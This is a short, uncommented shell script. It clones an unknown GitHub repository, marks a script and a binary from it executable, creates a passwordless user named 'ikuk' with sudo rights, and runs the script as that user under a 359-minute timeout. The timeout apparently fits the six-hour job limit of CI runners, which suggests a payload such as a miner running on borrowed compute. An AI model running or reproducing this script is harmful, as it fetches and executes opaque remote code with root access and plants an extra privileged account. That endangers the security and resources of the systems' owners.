sudo su
sudo apt update
git clone https://github.com/03081997/a.git && cd a
chmod +x 00.sh && chmod +x 00
sudo adduser --disabled-password --gecos "" ikuk && sudo usermod -aG sudo ikuk
sudo -u ikuk -H sh -c "timeout 359m ./00.sh"
sudo apt update
